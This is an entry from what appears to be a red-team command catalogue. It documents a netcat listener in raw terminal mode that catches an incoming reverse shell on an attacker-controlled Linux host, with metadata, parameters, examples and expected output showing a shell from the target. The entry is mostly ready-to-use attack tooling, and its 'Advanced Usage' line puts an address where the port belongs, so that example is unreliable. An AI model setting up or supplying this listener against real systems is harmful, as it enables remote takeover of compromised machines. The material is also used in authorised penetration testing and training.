---
id: 05b08393-2277-4a4d-b066-bca3943ed944
name: nc-listen-for-reverse-shell-on-port
type: command
executor: bash
data: stty raw -echo; (stty size; cat) | nc -lvnp $_LISTEN_PORT
output: null
created_at: '2023-04-06T03:56:25.077213+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - listener
verified: true
validated: true
---

# nc-listen-for-reverse-shell-on-port

## Command

```bash
stty raw -echo; (stty size; cat) | nc -lvnp $_LISTEN_PORT
```

## Description

This command sets up a Netcat listener in raw terminal mode to receive and handle an incoming reverse shell connection, enabling interactive remote access from a target machine. It is typically run on an attacker-controlled Linux system before triggering the payload on the target.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LISTEN_PORT | The port to listen on (e.g., 3001) | Yes |
| -l | Listen mode | Built-in |
| -v | Verbose output | Built-in |
| -n | No DNS resolution | Built-in |
| -p | Specify port | Built-in |

## Examples

### Basic Usage

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

### Advanced Usage

For a specific interface:
```bash
stty raw -echo; (stty size; cat) | nc -lvnp 0.0.0.0 4444
```

## Expected Output

Listening on [0.0.0.0] (family 0, port 3001)
Connection from [target_ip] 12345 received!
(Followed by interactive shell prompt from target, e.g., C:\Windows\system32>)

## Related

- [[procedures/Establish-Windows-Reverse-Shell-with-ConPtyShell]]
